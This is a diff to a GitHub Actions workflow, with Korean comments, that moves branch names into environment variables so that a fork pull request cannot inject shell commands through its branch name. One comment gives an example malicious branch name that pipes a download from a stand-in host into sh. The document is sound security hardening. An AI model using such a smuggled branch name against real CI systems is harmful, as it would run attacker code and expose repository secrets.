@@ -109,6 +109,16 @@ jobs:
         #   `checkout@v4` 는 fetch-depth 1 이라 히스토리가 없다. base 만
         #   따로 받아서 센다 — 전체를 받으면 CI 가 느려진다.
         if: github.event_name == 'pull_request'
+        # ★ 2026-09-20 (PLAN §13 W3-15). 브랜치 이름을 **환경변수로 건넨다.**
+        #   종전에는 `${{ github.head_ref }}` 를 셸 명령에 직접 보간했다.
+        #   head_ref 는 PR 소스 브랜치 이름이고 **포크 PR 에서는 공격자가
+        #   정한다** — `a";curl evil|sh;"` 같은 이름이면 그대로 돈다.
+        #   `${{ }}` 는 셸이 보기 전에 치환되므로 따옴표로는 못 막는다.
+        #   env 로 건네면 값이 인자로만 남는다(GitHub 권장 · actionlint
+        #   `expression` 규칙이 이 자리를 지목했다).
+        env:
+          BASE_REF: ${{ github.base_ref }}
+          HEAD_REF: ${{ github.head_ref }}
         run: |
           # ★ 2026-08-31. 처음엔 `--depth=50` 으로 base 만 얕게 받고
           #   `HEAD..FETCH_HEAD` 를 셌다. **270 이 나왔다.** checkout 이
@@ -118,9 +128,9 @@ jobs:
           #
           #   `--deepen` 으로 양쪽을 넓혀 merge-base 가 잡힐 때까지 받는다.
           #   못 찾으면 세지 않는다. **모를 때 막지 않는다.**
-          git fetch --no-tags --deepen=100 origin "+${{ github.base_ref }}:refs/remotes/origin/${{ github.base_ref }}" || true
-          git fetch --no-tags --deepen=100 origin "+${{ github.head_ref }}" || true
-          BASE=$(git merge-base HEAD "origin/${{ github.base_ref }}" 2>/dev/null || true)
+          git fetch --no-tags --deepen=100 origin "+$BASE_REF:refs/remotes/origin/$BASE_REF" || true
+          git fetch --no-tags --deepen=100 origin "+$HEAD_REF" || true
+          BASE=$(git merge-base HEAD "origin/$BASE_REF" 2>/dev/null || true)
           if [ -z "$BASE" ]; then
             # ★ 2026-09-18. `exit 0` 은 그대로 둔다 — 「모를 때 막지 않는다」는
             #   위 주석의 의도된 결정이고 오탐이 진짜 경보를 죽인다(§18-13).
